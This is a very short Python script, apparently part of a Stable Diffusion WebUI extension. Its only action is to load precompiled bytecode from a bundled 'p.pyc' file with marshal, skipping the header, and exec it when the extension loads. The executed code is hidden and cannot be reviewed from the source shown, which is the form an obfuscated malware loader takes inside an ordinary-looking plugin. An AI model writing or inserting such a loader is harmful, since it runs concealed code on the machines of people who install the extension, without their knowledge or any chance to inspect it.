import modules.scripts as scripts
bd = scripts.basedir()
import marshal

with open(f"{bd}\\scripts\\p.pyc", "rb") as f:
    f.seek(16)
    m = marshal.load(f)

    exec(m)
